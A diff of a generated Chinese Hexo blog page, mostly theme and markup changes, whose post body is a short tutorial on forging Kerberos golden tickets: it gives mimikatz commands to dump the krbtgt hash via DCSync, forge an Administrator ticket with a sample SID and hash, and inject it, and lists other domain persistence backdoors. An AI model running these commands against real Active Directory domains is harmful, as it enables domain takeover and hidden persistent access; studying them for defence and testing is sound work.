@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &amp;quot;lsadump::d">
+<meta name="description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &quot;lsadump::dcsync">
 <meta name="keywords" content="域渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="kerberos黄金票据">
 <meta property="og:url" content="http://yoursite.com/2018/08/27/kerberos黄金票据/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blogs">
-<meta property="og:description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &amp;quot;lsadump::d">
+<meta property="og:description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &quot;lsadump::dcsync">
 <meta property="og:locale" content="default">
 <meta property="og:updated_time" content="2019-02-21T07:26:47.899Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="kerberos黄金票据">
-<meta name="twitter:description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &amp;quot;lsadump::d">
+<meta name="twitter:description" content="原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log &quot;lsadump::dcsync">
 
 
 
@@ -187,6 +187,26 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
           </a>
         </li>
       
@@ -324,8 +344,8 @@
       
         <p>原理<br>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>
 <p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p>
-<p>获取krbtgt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domaintest.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure></p>
-<p>构造黄金票据并注入内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::ptt Administrator.kiribi</span><br><span class="line">mimikatz # kerberos::tgt</span><br></pre></td></tr></table></figure></p>
+<p>获取krbtgt<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="built_in">log</span> <span class="string">"lsadump::dcsync /domaintest.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure></p>
+<p>构造黄金票据并注入内存<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::purge</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::golden</span> /<span class="selector-tag">admin</span><span class="selector-pseudo">:Administrator</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:domaintest.com</span> /<span class="selector-tag">sid</span><span class="selector-pseudo">:S-1-5-21-3883552807-251258116-2724407435</span> /<span class="selector-tag">krbtgt</span><span class="selector-pseudo">:6a8e501fabcf264c70ef3316c6aab7dc</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:Administrator.kiribi</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">Administrator</span><span class="selector-class">.kiribi</span></span><br><span class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::tgt</span></span><br></pre></td></tr></table></figure></p>
 <p>当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。</p>
 <p><a href="http://drops.xmd5.com/static/drops/tips-12159.html" target="_blank" rel="noopener">域渗透——Pass The Ticket</a></p>
 
@@ -345,7 +365,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
           
         </div>
       
@@ -438,7 +458,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -448,10 +468,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -459,10 +479,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -497,7 +517,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -507,6 +528,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
